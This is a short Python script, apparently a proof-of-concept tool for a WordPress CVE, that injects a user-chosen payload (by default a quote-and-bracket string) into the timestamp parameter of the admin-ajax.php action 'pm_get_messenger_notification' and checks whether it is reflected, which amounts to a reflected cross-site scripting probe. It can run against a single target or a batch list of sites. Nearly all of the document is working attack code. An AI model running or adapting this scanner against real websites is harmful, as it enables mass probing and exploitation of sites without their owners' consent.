import requests
import argparse
import urllib.parse
import os

print(
r'''
 ▗▄▄▖▗▖  ▗▖▗▄▄▄▖    ▄▄▄▄ ▄▀▀▚▖▄▄▄▄ ▄▄▄▄ ▄▄▄▄ ▄▄▄▄ ▗▄▄▄▖▗▄▄▄▖
▐▌   ▐▌  ▐▌▐▌          █ █  ▐▌   █ █    █    █  █    ▐▌   ▐▌
▐▌   ▐▌  ▐▌▐▛▀▀▘    █▀▀▀ █  ▐▌█▀▀▀ ▀▀▀█ █▀▀█ ▀▀▀█    ▐▌   ▐▌
▝▚▄▄▖ ▝▚▞▘ ▐▙▄▄▖    █▄▄▄ ▀▄▄▞▘█▄▄▄ ▄▄▄█ █▄▄█ ▄▄▄█    ▐▌   ▐▌
                                                            
                                                            
▗▖   ▄   ▄     ▗▞▀▘▗▞▀▜▌▄▄▄▄  ▄    ■  ▗▞▀▚▖▄   ▄            
▐▌   █   █     ▝▚▄▖▝▚▄▟▌█   █ ▄ ▗▄▟▙▄▖▐▛▀▀▘█   █            
▐▛▀▚▖ ▀▀▀█              █   █ █   ▐▌  ▝▚▄▄▖ ▀▀▀█            
▐▙▄▞▘▄   █                    █   ▐▌       ▄   █            
      ▀▀▀                         ▐▌        ▀▀▀             
'''


        )

def get_single(target, payload):
    payloadEncoded = urllib.parse.quote(payload)
    resp = requests.get(f"{target}/wp-admin/admin-ajax.php?action=pm_get_messenger_notification&timestamp={payload}&activity=asdfasdfasdf&tid=1")
    print(resp.text)

    return (target, resp.status_code, payload in resp.text)

def print_output(target, status_code, payload_visible):
    print(f"\033[0;32m[+]\033[0;0m {target} :[{status_code}]: payload printed ({payload_visible})")

def get_batch(targets, payload):
    for target in targets:
        targ, status_code, payload_visible = get_single(target.strip(), payload)
        print_output(targ, status_code, payload_visible)


if __name__ == "__main__":
    parser = argparse.ArgumentParser()

    parser.add_argument(
        "-t",
        "--target",
        help="Specify a single target"
    )

    parser.add_argument(
            "-l",
            "--list",
            help="specify a targets file"
            )

    parser.add_argument(
            "-p",
            "--payload",
            help="specify custom payload",
            default="><'",
            )

    args = parser.parse_args()

    if not args.target and not args.list:
        parser.print_help()
    if args.target and args.list:
        parser.print_help()

    payload = args.payload
    


    if args.target:
        target = args.target
        target, status_code, visible= get_single(target, payload)
        print_output(target, status_code, visible)
    elif args.list:
        path = os.getcwd() + args.list
        file = open(path)
        records = file.readlines()
        get_batch(records, payload)


